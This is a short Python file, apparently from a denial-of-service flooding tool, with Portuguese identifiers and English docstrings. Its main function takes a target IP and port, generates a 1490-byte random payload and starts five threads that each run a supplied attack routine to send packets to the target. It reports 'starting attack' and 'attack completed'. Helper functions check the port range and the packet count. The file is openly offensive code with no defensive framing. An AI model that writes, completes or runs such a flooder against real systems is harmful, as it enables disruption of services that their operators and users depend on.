import random
import threading
from colorama import Fore, init
def main_ip(ip, porta, quantidade, executar_ataque):
    """
    Main function.

    Parameters:
        ip (str): Target's IP address.
        port (int): Target's port number.
        quantity (int): Number of packets to be sent.
        execute_attack (function): Function responsible for executing the attack.

    Returns:
        None. It only executes the attack.
    """
    if not ip or not porta:
        print(Fore.RED + "invalid entry closing...")
        return

    try:
        target = (ip, porta)
        print(Fore.YELLOW + f"starting attack on target {target[0]}:{target[1]}")

        bytes = random._urandom(1490)
        
        threads = []
        num_threads = 5  
        for _ in range(num_threads):
            thread = threading.Thread(target=executar_ataque, args=(target, bytes, quantidade))

            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        print(Fore.CYAN + "attack completed!")
    except Exception as e:
        print(Fore.RED + f"a general error has occurred: {e}")
def validar_quantidade(quantidade):
    """
    Function to validate the number of packets.

    Parameter:
        quantity (int): Number of packets to be sent.

    Returns:
        quantity (int): Validated quantity.

    Exceptions:
        Raises an error if the quantity is negative.
    """
    
    if quantidade < 0:
        raise ValueError("quantity cannot be negative.")
    return quantidade
def validar_porta(porta):
    """
    Function to validate the target port.

    Parameter:
        port (int): Port number.

    Returns:
        port (int): Validated port.

    Exceptions:
        Raises an error if the port is outside the valid range (1 to 65535).
    """
    if porta < 1 or porta > 65535:
        raise ValueError("Invalid port. Enter a value between 1 and 65535.")
    return porta
